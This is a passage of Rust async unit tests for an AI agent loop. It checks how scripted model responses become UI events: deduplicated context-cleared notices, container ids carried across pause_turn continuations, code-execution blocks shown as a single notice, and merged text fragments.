        [ContentBlock::ToolResult { tool_use_id, .. }] => assert_eq!(tool_use_id, "tu1"),
        other => panic!("expected only the client tool's result, got {other:?}"),
    }

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

// The API reports the same clearing on every request while the old results stay in
// history, so only a changed notice is shown again.
#[tokio::test]
async fn context_cleared_notice_shows_only_when_it_changes() {
    let (session, dir) = mk_session();
    let cleared = |text: &str, warning: Option<&str>| Response {
        warning: warning.map(String::from),
        context_cleared: Some(text.into()),
        ..end_turn_response("ok")
    };
    let provider = ScriptedProvider {
        responses: std::sync::Mutex::new(vec![
            cleared("cleared 1", None),
            cleared("cleared 1", Some("caps unknown")),
            cleared("cleared 2", None),
        ]),
        seen_messages: std::sync::Arc::new(std::sync::Mutex::new(Vec::new())),
        seen_tools: std::sync::Arc::new(std::sync::Mutex::new(Vec::new())),
    };
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(64);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, PeerSet::default(), None),
    ));
    let mut notices = Vec::new();
    for _ in 0..3 {
        ui_tx
            .send((None, UiEvent::UserMessage { text: "go".into() }))
            .await
            .unwrap();
        while let Some(ev) = agent_rx.recv().await {
            match ev {
                AgentEvent::Notice { text } => notices.push(text),
                AgentEvent::TurnComplete => break,
                _ => {}
            }
        }
    }
    assert_eq!(notices, ["cleared 1", "caps unknown", "cleared 2"]);

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

struct ContainerLogProvider {
    responses: std::sync::Mutex<Vec<Response>>,
    seen_containers: std::sync::Arc<std::sync::Mutex<Vec<Option<String>>>>,
}
impl Provider for ContainerLogProvider {
    async fn complete(&self, req: &Request<'_>) -> Result<Response> {
        self.seen_containers
            .lock()
            .unwrap()
            .push(req.container.map(String::from));
        Ok(self.responses.lock().unwrap().remove(0))
    }
    async fn count_tokens(&self, _req: &Request<'_>) -> Result<u64> {
        Ok(0)
    }
}

fn code_execution_blocks() -> Vec<ContentBlock> {
    vec![
        ContentBlock::ServerToolUse {
            id: "srvexec".into(),
            name: "code_execution".into(),
            input: serde_json::json!({"code": "print(await web_search({'query': 'q'}))"}),
            extra: Default::default(),
        },
        ContentBlock::Other(serde_json::json!({
            "type": "code_execution_tool_result", "tool_use_id": "srvexec",
            "content": {"type": "code_execution_result", "stdout": "", "stderr": "",
                        "return_code": 0, "content": []}
        })),
    ]
}

fn paused(content: Vec<ContentBlock>, container_id: Option<&str>) -> Response {
    Response {
        content,
        stop_reason: "pause_turn".into(),
        usage: Usage::default(),
        container_id: container_id.map(String::from),
        warning: None,
        context_cleared: None,
    }
}

// The container rides only on same-turn pause_turn continuations; the latest id
// survives a pause whose response omits it.
#[tokio::test]
async fn pause_turn_continuations_carry_the_turns_container() {
    let (session, dir) = mk_session();
    let seen_containers = std::sync::Arc::new(std::sync::Mutex::new(Vec::new()));
    let provider = ContainerLogProvider {
        responses: std::sync::Mutex::new(vec![
            paused(code_execution_blocks(), Some("container_1")),
            paused(Vec::new(), None),
            end_turn_response("done"),
            end_turn_response("second turn"),
            paused(web_search_blocks("srv1", web_search_hits()), None),
            end_turn_response("third turn"),
        ]),
        seen_containers: seen_containers.clone(),
    };
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(64);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, PeerSet::default(), None),
    ));
    for _ in 0..3 {
        ui_tx
            .send((None, UiEvent::UserMessage { text: "go".into() }))
            .await
            .unwrap();
        while let Some(ev) = agent_rx.recv().await {
            if matches!(ev, AgentEvent::TurnComplete) {
                break;
            }
        }
    }

    let container_1 = Some("container_1".to_string());
    assert_eq!(
        *seen_containers.lock().unwrap(),
        [None, container_1.clone(), container_1, None, None, None]
    );

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

// No tool card, so none is ever left running without a result.
#[tokio::test]
async fn code_execution_blocks_render_as_one_notice_without_cards() {
    let (session, dir) = mk_session();
    let mut content = code_execution_blocks();
    content.extend(code_execution_blocks());
    content.extend(web_search_blocks("srv1", web_search_hits()));
    let provider = ContainerLogProvider {
        responses: std::sync::Mutex::new(vec![Response {
            content,
            stop_reason: "end_turn".into(),
            usage: Usage::default(),
            container_id: Some("container_1".into()),
            warning: Some("caps unknown".into()),
            context_cleared: None,
        }]),
        seen_containers: std::sync::Arc::new(std::sync::Mutex::new(Vec::new())),
    };
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(64);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, PeerSet::default(), None),
    ));
    ui_tx
        .send((None, UiEvent::UserMessage { text: "go".into() }))
        .await
        .unwrap();
    let mut events = Vec::new();
    while let Some(ev) = agent_rx.recv().await {
        match ev {
            AgentEvent::ToolUseStart { id, name, .. } => events.push(format!("start {id} {name}")),
            AgentEvent::ToolResult { id, .. } => events.push(format!("result {id}")),
            AgentEvent::Notice { text } => events.push(format!("notice {text}")),
            AgentEvent::TurnComplete => break,
            _ => {}
        }
    }
    assert_eq!(
        events,
        [
            "notice caps unknown".to_string(),
            "start srv1 WebSearch".to_string(),
            "result srv1".to_string(),
            format!("notice {}", crate::llm::CODE_EXECUTION_NOTICE),
        ]
    );

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}

// A cited answer arrives as many text fragments, some empty.
#[tokio::test]
async fn consecutive_text_blocks_emit_one_assistant_text_per_run() {
    let (session, dir) = mk_session();
    let text = |t: &str| ContentBlock::Text { text: t.into() };
    let mut content = vec![text("| a |\n"), text(""), text("| b |")];
    content.extend(web_search_blocks("srv1", web_search_hits()));
    content.extend([text("x"), text("y")]);
    let provider = ContainerLogProvider {
        responses: std::sync::Mutex::new(vec![Response {
            content,
            stop_reason: "end_turn".into(),
            usage: Usage::default(),
            container_id: None,
            warning: None,
            context_cleared: None,
        }]),
        seen_containers: std::sync::Arc::new(std::sync::Mutex::new(Vec::new())),
    };
    let (ui_tx, ui_rx) = mpsc::channel(16);
    let (agent_tx, mut agent_rx) = mpsc::channel(64);
    let task = tokio::spawn(run_agent(
        mk_cfg(),
        provider,
        FakeBackend,
        session,
        Vec::new(),
        mk_io(ui_rx, agent_tx, PeerSet::default(), None),
    ));
    ui_tx
        .send((None, UiEvent::UserMessage { text: "go".into() }))
        .await
        .unwrap();
    let mut events = Vec::new();
    while let Some(ev) = agent_rx.recv().await {
        match ev {
            AgentEvent::AssistantText { text } => events.push(format!("text {text:?}")),
            AgentEvent::ToolUseStart { id, .. } => events.push(format!("start {id}")),
            AgentEvent::ToolResult { id, .. } => events.push(format!("result {id}")),
            AgentEvent::TurnComplete => break,
            _ => {}
        }
    }
    assert_eq!(
        events,
        [
            r#"text "| a |\n| b |""#,
            "start srv1",
            "result srv1",
            r#"text "xy""#,
        ]
    );

    ui_tx.send((None, UiEvent::Quit)).await.unwrap();
    task.await.unwrap().unwrap();
    std::fs::remove_dir_all(&dir).ok();
}
